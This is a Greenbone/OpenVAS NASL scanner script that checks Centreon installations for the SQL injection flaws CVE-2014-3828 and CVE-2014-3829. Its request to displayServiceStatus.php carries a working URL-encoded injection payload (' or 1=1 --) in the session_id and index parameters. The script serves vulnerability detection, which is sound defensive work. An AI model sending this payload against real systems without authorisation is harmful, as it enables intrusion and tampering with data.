# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:centreon:centreon";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105098");
  script_version("2025-01-31T15:39:24+0000");
  script_cve_id("CVE-2014-3828", "CVE-2014-3829");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-01-31 15:39:24 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2014-10-28 12:37:14 +0100 (Tue, 28 Oct 2014)");
  script_category(ACT_ATTACK);
  script_name("Centreon <= 2.5.1, Centreon Enterprise Server <= 2.2 Multiple SQLi Vulnerabilities");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_centreon_web_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("centreon_web/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210122064603/http://www.securityfocus.com/bid/70648");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210122064603/http://www.securityfocus.com/bid/70649");

  script_tag(name:"summary", value:"Centreon and Centreon Enterprise Server are prone to multiple
  SQL injection (SQLi) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Centreon fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying
  database.");

  script_tag(name:"affected", value:"The following products are vulnerable:

  - Centreon 2.5.1 and prior versions

  - Centreon Enterprise Server 2.2 and prior versions");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/include/views/graphs/graphStatus/displayServiceStatus.php?session_id=0%27%20or%201%3D1%20--%20%2F**%26index%3D1%27%20or%201%3D1%20--%20%2F**";

if( http_vuln_check( port:port, url:url, pattern:"sh: graph: command not found" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
